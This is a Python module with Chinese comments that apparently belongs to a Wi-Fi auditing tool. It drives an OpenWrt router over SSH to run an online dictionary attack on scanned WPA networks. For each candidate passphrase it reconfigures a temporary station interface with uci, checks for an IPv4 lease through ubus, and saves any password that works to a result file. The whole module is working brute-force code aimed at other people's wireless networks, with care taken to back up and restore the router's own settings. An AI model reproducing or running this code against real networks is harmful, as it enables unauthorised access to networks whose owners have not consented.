"""OpenWrt 在线密码字典验证任务接口。"""

import json
import re
import time
from dataclasses import dataclass
from pathlib import Path

from modules.capture_services.openwrt.command_builder import normalize_bssid, quote_argument
from modules.capture_services.openwrt.result_converter import final_results_dir, safe_result_stem


# 字典上限：在线逐个试连很慢，超限只取前部并如实告知，避免任务跑到天荒地老。
_MAX_CANDIDATES = 100000

# 远端备份与临时配置统一放在会话独立目录，不用固定 .bak 覆盖用户旧备份。
_REMOTE_BACKUP_FILES = ("wireless", "network", "firewall")


@dataclass(frozen=True)
class PasswordTargetResult:
    """单个目标的验证结局：found 为真时 password_file 是写有密码的结果文件。

    候选密码本身只进结果文件，绝不出现在 note、消息或快照中。
    """

    bssid: str
    ssid: str
    found: bool
    tried: int
    total: int
    password_file: str = ""
    note: str = ""


@dataclass(frozen=True)
class PasswordVerifyUpdate:
    """V worker 发给主线程的逐密码进度，不携带候选密码内容。"""

    tried: int
    total: int
    target_label: str = ""
    target_index: int = 0
    target_total: int = 0


class PasswordVerifyCancelled(RuntimeError):
    """用户取消或 SSH 中断时的内部控制流，已试部分保留计数。"""


def dictionary_paths(settings):
    """返回按顺序去重、解析便携标记的字典列表，兼容旧单路径设置。"""
    from modules.config_services.capture_settings_manager import CaptureSettingsManager
    values = settings.get("password_dictionaries")
    if not isinstance(values, (list, tuple)):
        values = [settings.get("password_dictionary", "")]
    paths = []
    seen = set()
    for value in values:
        if not isinstance(value, str) or not value.strip():
            continue
        path = str(CaptureSettingsManager.resolve_path(value.strip()))
        key = path.casefold()
        if key not in seen:
            paths.append(path)
            seen.add(key)
    return tuple(paths)


class OpenWrtPasswordVerifier:
    """隔离高副作用密码验证，不与普通抓包或 WPS 实现混合。

    流程：读本地字典→选 radio→唯一备份→建临时 STA→逐密码试连（ubus 判成功）→
    手术恢复（失败回退整文件覆盖）。任何退出路径都尝试恢复路由器配置。
    """

    def __init__(self, command_runner):
        self.command_runner = command_runner

    @staticmethod
    def load_candidates(local_path, cancel_event=None):
        """读取 Windows 本地字典，返回 (候选元组, 跳过数)。

        参数 local_path 是已校验存在的字典文件。只收 8-64 字符的去重非空行
        （WPA 口令长度范围）；超限截断。调用方负责文件存在性校验。
        """

        seen = []
        unique = set()
        skipped = 0
        paths = (local_path,) if isinstance(local_path, (str, Path)) else tuple(local_path)
        for path in paths:
            if cancel_event is not None and cancel_event.is_set():
                raise InterruptedError("字典统计已取消。")
            with open(path, "r", encoding="utf-8", errors="replace") as handle:
                for line in handle:
                    if cancel_event is not None and cancel_event.is_set():
                        raise InterruptedError("字典统计已取消。")
                    text = line.strip().strip("\ufeff")
                    if len(seen) >= _MAX_CANDIDATES or not 8 <= len(text) <= 64 or text in unique:
                        skipped += 1
                        continue
                    seen.append(text)
                    unique.add(text)
        return tuple(seen), skipped

    def verify_targets(
        self,
        targets,
        candidates,
        session_id,
        local_output_dir,
        cancel_event=None,
        progress_callback=None,
        target_callback=None,
        pause_control=None,
    ):
        """对多个已扫描目标逐个在线试密码，返回每目标结局元组。

        参数：targets 是 AccessPointInfo 元组；candidates 是口令元组；
        session_id 用于远端唯一命名；local_output_dir 是 Windows 结果目录；
        cancel_event 取消；progress_callback 接收 PasswordVerifyUpdate；
        target_callback(index, entry) 只报告开始（entry 为 None）与实际结局。
        pause_control 只在目标/候选边界等待，当前候选完成后暂停，恢复阶段不等待。
        副作用：修改路由器 wireless/network/firewall（先唯一备份，finally 恢复）。
        """

        local_output_dir = Path(local_output_dir)
        short = "".join(char for char in str(session_id or "") if char.isalnum())[:8] or "session"
        sta_section = f"wifinet_pw{short}"
        net_name = f"pwnet_{short}"
        backup_dir = f"/tmp/winbox-pw-{short}"
        results = []
        setup_done = False
        self.last_restore_errors = ""
        try:
            self._backup_configs(backup_dir, cancel_event)
            for index, target in enumerate(targets):
                if pause_control is not None:
                    pause_control.checkpoint()
                self._check_cancel(cancel_event)
                if target_callback is not None:
                    target_callback(index, None)
                outcome = self._verify_single(
                    target,
                    candidates,
                    index,
                    len(targets),
                    sta_section,
                    net_name,
                    local_output_dir,
                    cancel_event,
                    progress_callback,
                    setup_done,
                    pause_control,
                )
                setup_done = outcome["setup_done"]
                results.append(outcome["entry"])
                if target_callback is not None:
                    target_callback(index, outcome["entry"])
            return tuple(results)
        finally:
            if pause_control is not None:
                pause_control.finish()
            errors = self._restore(sta_section, net_name, backup_dir, cancel_event)
            self.last_restore_errors = errors
            if errors and results:
                last = results[-1]
                results[-1] = PasswordTargetResult(
                    bssid=last.bssid,
                    ssid=last.ssid,
                    found=last.found,
                    tried=last.tried,
                    total=last.total,
                    password_file=last.password_file,
                    note="；".join(filter(None, [last.note, errors])),
                )

    def _verify_single(
        self,
        target,
        candidates,
        index,
        total_targets,
        sta_section,
        net_name,
        local_output_dir,
        cancel_event,
        progress_callback,
        setup_done,
        pause_control=None,
    ):
        """验证单个目标：建 STA 环境（首个目标一次）后逐密码试连。"""

        try:
            bssid = normalize_bssid(target.bssid)
        except ValueError:
            return {
                "entry": PasswordTargetResult(
                    bssid=str(target.bssid or ""),
                    ssid=str(target.ssid or ""),
                    found=False,
                    tried=0,
                    total=len(candidates),
                    note="BSSID 格式不正确，跳过。",
                ),
                "setup_done": setup_done,
            }
        ssid = str(target.ssid or "").strip()
        encryption = str(getattr(target, "encryption", "") or "").upper()
        if not ssid or ssid == "__hidden__":
            return {
                "entry": PasswordTargetResult(
                    bssid=bssid,
                    ssid=ssid,
                    found=False,
                    tried=0,
                    total=len(candidates),
                    note="隐藏网络无法定向试连，跳过。",
                ),
                "setup_done": setup_done,
            }
        if "OPN" in encryption or not encryption:
            return {
                "entry": PasswordTargetResult(
                    bssid=bssid,
                    ssid=ssid,
                    found=False,
                    tried=0,
                    total=len(candidates),
                    note="开放网络无需猜密码，跳过。",
                ),
                "setup_done": setup_done,
            }
        if "SAE" in encryption and "PSK" not in encryption and "WPA" not in encryption:
            return {
                "entry": PasswordTargetResult(
                    bssid=bssid,
                    ssid=ssid,
                    found=False,
                    tried=0,
                    total=len(candidates),
                    note="纯 SAE 加密暂不支持在线试连，跳过。",
                ),
                "setup_done": setup_done,
            }
        label = ssid or bssid
        if not setup_done:
            radio = self._pick_radio(str(getattr(target, "band", "2.4G") or "2.4G"), cancel_event)
            self._setup_environment(sta_section, net_name, radio, cancel_event)
            setup_done = True
        tried = 0
        for password in candidates:
            if pause_control is not None:
                pause_control.checkpoint()
            self._check_cancel(cancel_event)
            self._set_credentials(sta_section, ssid, bssid, password, cancel_event)
            tried += 1
            if progress_callback is not None:
                progress_callback(
                    PasswordVerifyUpdate(
                        tried=tried,
                        total=len(candidates),
                        target_label=label,
                        target_index=index,
                        target_total=total_targets,
                    )
                )
            if self._verify_connection(net_name, cancel_event):
                stem = safe_result_stem(ssid, bssid)
                out_path = final_results_dir(local_output_dir) / f"{stem}-password.txt"
                # 密码只写结果文件，不进日志、消息和快照。
                fields = [
                    value.replace("\\", "\\\\").replace("\t", "\\t").replace("\r", "\\r").replace("\n", "\\n")
                    for value in (ssid, bssid, password)
                ]
                out_path.write_text("Wi-Fi名称\tMAC\t密码\n" + "\t".join(fields) + "\n", encoding="utf-8")
                return {
                    "entry": PasswordTargetResult(
                        bssid=bssid,
                        ssid=ssid,
                        found=True,
                        tried=tried,
                        total=len(candidates),
                        password_file=str(out_path),
                    ),
                    "setup_done": setup_done,
                }
        return {
            "entry": PasswordTargetResult(
                bssid=bssid,
                ssid=ssid,
                found=False,
                tried=tried,
                total=len(candidates),
                note=f"字典 {len(candidates)} 个候选全部试过，未连上。",
            ),
            "setup_done": setup_done,
        }

    def _pick_radio(self, band, cancel_event):
        """按频段选一个可用的 wireless 设备名，不存在时抛错。"""

        self._check_cancel(cancel_event)
        result = self.command_runner.run("password_list_radios", "uci show wireless", timeout=20, cancel_event=cancel_event)
        self._raise_if_cancelled(result, "在线密码验证已取消。")
        if result.exit_code != 0:
            raise RuntimeError("读取路由器无线配置失败，无法选择验证网卡。")
        devices = {}
        current = ""
        for line in (result.stdout or "").splitlines():
            match = re.match(r"wireless\.([A-Za-z0-9_]+)=(\S+)", line.strip())
            if match and match.group(2) == "wifi-device":
                current = match.group(1)
                devices[current] = {}
                continue
            match = re.match(r"wireless\.([A-Za-z0-9_]+)\.(\S+?)='(.*)'$", line.strip())
            if match and match.group(1) == current:
                devices[current][match.group(2)] = match.group(3)
        want_5g = "5G" in str(band).upper()
        fallback = ""
        for name, options in devices.items():
            if options.get("disabled", "0") == "1":
                continue
            band_option = str(options.get("band", "") or "").lower()
            hwmode = str(options.get("hwmode", "") or "").lower()
            channel = options.get("channel", "")
            is_5g = (
                band_option.startswith("5")
                or "11a" in hwmode
                or (str(channel).isdigit() and int(channel) >= 36)
            )
            is_2g = (
                band_option.startswith("2")
                or "11g" in hwmode
                or "11b" in hwmode
                or (str(channel).isdigit() and 1 <= int(channel) <= 14)
            )
            if not fallback and (is_5g or is_2g or (not band_option and not hwmode)):
                fallback = name
            if want_5g and is_5g:
                return name
            if not want_5g and is_2g:
                return name
        if fallback:
            return fallback
        raise RuntimeError("路由器上没有可用的无线设备，无法在线验证。")

    def _setup_environment(self, sta_section, net_name, radio, cancel_event):
        """建临时 STA 与 DHCP 网络，禁用其他无线接口（状态已备份，按名恢复）。"""

        commands = [
            f"uci set wireless.{sta_section}=wifi-iface",
            f"uci set wireless.{sta_section}.device={quote_argument(radio)}",
            f"uci set wireless.{sta_section}.network={quote_argument(net_name)}",
            f"uci set wireless.{sta_section}.mode='sta'",
            f"uci set wireless.{sta_section}.encryption='psk2'",
            f"uci set wireless.{sta_section}.disabled='0'",
            f"uci set network.{net_name}=interface",
            f"uci set network.{net_name}.proto='dhcp'",
            "uci commit wireless",
            "uci commit network",
        ]
        # wan zone 在备份阶段已查好，这里直接复用，不重复探测。
        zone = getattr(self, "_wan_zone", None)
        if zone is not None:
            commands.append(
                f"uci add_list firewall.{zone}.network={quote_argument(net_name)}"
            )
            commands.append("uci commit firewall")
        # 禁用其他 wifi-iface，保证试连不受本机 AP 干扰；原 disabled 值已备份。
        others = self._other_ifaces(sta_section, cancel_event)
        for iface in others:
            commands.append(f"uci set wireless.{iface}.disabled='1'")
        if others:
            commands.append("uci commit wireless")
        self._run_batch("password_setup_env", commands, cancel_event)
        self._run("password_reload", "wifi reload >/dev/null 2>&1", 60, cancel_event)
        self._sleep(5, cancel_event)
        self._run("password_ifup", f"ifup {quote_argument(net_name)}", 30, cancel_event)
        self._sleep(3, cancel_event)

    def _set_credentials(self, sta_section, ssid, bssid, password, cancel_event):
        """写入本次试连的 SSID/BSSID/密码并重载无线。"""

        commands = [
            f"uci set wireless.{sta_section}.ssid={quote_argument(ssid)}",
            f"uci set wireless.{sta_section}.bssid={quote_argument(bssid)}",
            f"uci set wireless.{sta_section}.key={quote_argument(password)}",
            "uci commit wireless",
        ]
        self._run_batch("password_set_cred", commands, cancel_event)
        self._run("password_reload", "wifi reload >/dev/null 2>&1", 60, cancel_event)
        self._sleep(5, cancel_event)

    def _verify_connection(self, net_name, cancel_event):
        """用 netifd 状态判断是否拿到 IPv4，连续稳定才算成功。"""

        stable = 0
        for _round in range(14):
            self._check_cancel(cancel_event)
            if self._interface_up(net_name, cancel_event):
                self._check_cancel(cancel_event)
                stable += 1
                # 密码错误有时短暂关联后即断，连续 3 轮都在才算。
                if stable >= 3:
                    return True
                self._sleep(2, cancel_event)
            else:
                stable = 0
                self._sleep(2, cancel_event)
        return False

    def _interface_up(self, net_name, cancel_event):
        """读 ubus 看接口是否 up 且有 IPv4；解析失败按未连上处理。"""

        try:
            result = self.command_runner.run(
                "password_check_link",
                f"ubus call network.interface.{net_name} status",
                timeout=15,
                cancel_event=cancel_event,
            )
        except Exception:
            return False
        self._raise_if_cancelled(result, "在线密码验证已取消。")
        if result.exit_code != 0:
            return False
        try:
            data = json.loads(result.stdout or "{}")
        except (ValueError, TypeError):
            return False
        if not isinstance(data, dict) or not data.get("up"):
            return False
        addresses = data.get("ipv4-address") or []
        return any(isinstance(item, dict) and item.get("address") for item in addresses)

    def _backup_configs(self, backup_dir, cancel_event):
        """把 wireless/network/firewall 拷到会话独立远端目录，不覆盖用户旧备份。"""

        self._check_cancel(cancel_event)
        commands = [f"mkdir -p {quote_argument(backup_dir)}"]
        for name in _REMOTE_BACKUP_FILES:
            commands.append(
                f"cp /etc/config/{name} {quote_argument(backup_dir)}/{name} 2>/dev/null || true"
            )
        # 记下其他 wifi-iface 的 disabled 原值，恢复时按名写回。
        self._run_batch("password_backup", commands, cancel_event)
        self._original_disabled = self._read_disabled_map(cancel_event)
        self._wan_zone = self._find_wan_zone(cancel_event)

    def _read_disabled_map(self, cancel_event):
        """读取所有 wifi-iface 的 disabled 原值，失败返回空（恢复时跳过）。"""

        try:
            result = self.command_runner.run(
                "password_read_ifaces", "uci show wireless", timeout=20, cancel_event=cancel_event
            )
        except Exception:
            return {}
        if result.cancelled or result.exit_code != 0:
            return {}
        disabled = {}
        current = ""
        for line in (result.stdout or "").splitlines():
            match = re.match(r"wireless\.([A-Za-z0-9_]+)=(\S+)", line.strip())
            if match and match.group(2) == "wifi-iface":
                current = match.group(1)
                continue
            match = re.match(r"wireless\.([A-Za-z0-9_]+)\.disabled='([01])'$", line.strip())
            if match and match.group(1) == current and current:
                disabled[current] = match.group(2)
        return disabled

    def _other_ifaces(self, sta_section, cancel_event):
        """列出除临时 STA 外的 wifi-iface 名，失败返回空（不阻断主流程）。"""

        return [
            name
            for name in (getattr(self, "_original_disabled", {}) or {})
            if name != sta_section
        ]

    def _find_wan_zone(self, cancel_event):
        """找 name='wan' 的 firewall zone 索引（如 @zone[1]），找不到返回 None。"""

        try:
            result = self.command_runner.run(
                "password_find_zone", "uci show firewall", timeout=20, cancel_event=cancel_event
            )
        except Exception:
            return None
        if result.cancelled or result.exit_code != 0:
            return None
        current = ""
        for line in (result.stdout or "").splitlines():
            match = re.match(r"firewall\.(@zone\[\d+\])=zone", line.strip())
            if match:
                current = match.group(1)
                continue
            if current and line.strip() == f"firewall.{current}.name='wan'":
                return current
        return None

    def _restore(self, sta_section, net_name, backup_dir, cancel_event):
        """手术恢复：删临时配置、写回 disabled、摘防火墙；失败回退整文件覆盖。

        返回值：空串表示干净恢复，否则是给用户看的恢复异常说明（不含密码）。
        """

        errors = []
        zone = getattr(self, "_wan_zone", None)
        commands = [
            f"uci delete wireless.{sta_section} 2>/dev/null || true",
            f"uci delete network.{net_name} 2>/dev/null || true",
        ]
        for iface, value in (getattr(self, "_original_disabled", {}) or {}).items():
            if iface == sta_section:
                continue
            commands.append(f"uci set wireless.{iface}.disabled='{value}'")
        if zone is not None:
            commands.append(
                f"uci del_list firewall.{zone}.network={quote_argument(net_name)} 2>/dev/null || true"
            )
        commands.extend(["uci commit wireless", "uci commit network", "uci commit firewall"])
        try:
            self._run_batch("password_restore", commands, None)
        except Exception as exc:
            errors.append(f"手术恢复失败：{exc}")
        if errors:
            # 回退：会话独立备份整文件覆盖回来（不碰用户自己的 .bak）。
            fallback = " ; ".join(
                f"cp {quote_argument(backup_dir)}/{name} /etc/config/{name} 2>/dev/null || true"
                for name in _REMOTE_BACKUP_FILES
            )
            try:
                self._run_batch("password_restore_fallback", [fallback, "uci commit", "wifi reload >/dev/null 2>&1"], None)
            except Exception as exc:
                errors.append(f"备份回退也失败，现场在远端 {backup_dir}：{exc}")
        try:
            self._run("password_net_restart", "/etc/init.d/network restart >/dev/null 2>&1", 60, None)
        except Exception as exc:
            errors.append(f"网络重启失败，请检查路由器：{exc}")
        return "；".join(errors)

    def _run_batch(self, name, commands, cancel_event):
        """按序执行一批短命令；失败抛错并附带远端输出摘要（脱敏：不含密码）。"""

        for command in commands:
            self._run(name, command, 30, cancel_event)

    def _run(self, name, command, timeout, cancel_event):
        """执行单条远端命令；取消、超时、非零退出一律抛错。"""

        self._check_cancel(cancel_event)
        result = self.command_runner.run(name, command, timeout=timeout, cancel_event=cancel_event)
        self._check_cancel(cancel_event)
        self._raise_if_cancelled(result, "在线密码验证已取消。")
        if getattr(result, "timed_out", False):
            raise RuntimeError(f"路由器命令超时：{name}。")
        if result.exit_code != 0:
            detail = ((getattr(result, "stderr", "") or "") or (result.stdout or "")).strip()
            # 恢复类命令自带 || true，走到这里的是主流程命令；输出可能含配置
            # 回显但不含候选密码（密码只出现在 set key 那条，失败摘要截断长度）。
            raise RuntimeError(f"路由器命令失败（{name}）：{detail[:200] or result.exit_code}。")

    @staticmethod
    def _raise_if_cancelled(result, message):
        if result.cancelled:
            raise PasswordVerifyCancelled(message)

    @staticmethod
    def _check_cancel(cancel_event):
        if cancel_event is not None and cancel_event.is_set():
            raise PasswordVerifyCancelled("在线密码验证已取消。")

    @staticmethod
    def _sleep(seconds, cancel_event):
        """可取消的等待，每 0.5 秒检查一次取消。"""

        deadline = time.monotonic() + max(0, seconds)
        while time.monotonic() < deadline:
            if cancel_event is not None and cancel_event.is_set():
                raise PasswordVerifyCancelled("在线密码验证已取消。")
            time.sleep(min(0.5, max(0.0, deadline - time.monotonic())))
